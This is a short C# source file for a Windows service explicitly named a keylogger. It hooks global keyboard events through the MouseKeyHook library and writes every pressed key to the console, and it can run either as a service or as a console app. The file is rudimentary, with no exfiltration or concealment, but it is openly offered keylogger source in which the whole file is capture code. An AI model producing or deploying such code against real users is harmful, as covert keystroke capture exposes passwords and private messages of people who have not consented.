using Gma.System.MouseKeyHook;
using System;
using System.ServiceProcess;
using System.Windows.Forms;

namespace Keylogger
{
    public partial class KeyloggerService : ServiceBase
    {
        public KeyloggerService()
        {
            InitializeComponent();
        }

        public void ExecuteAsConsoleApplication(string[] args)
        {
            this.OnStart(args);

            Console.ReadLine();

            this.OnStop();
        }

        protected override void OnStart(string[] args)
        {
            IKeyboardMouseEvents hook = Hook.GlobalEvents();

            hook.KeyPress += OnKeyPressed;

            Application.Run();
        }

        private static void OnKeyPressed(object sender, KeyPressEventArgs args)
        {
            Console.WriteLine(args.KeyChar.ToString());
        }
    }
}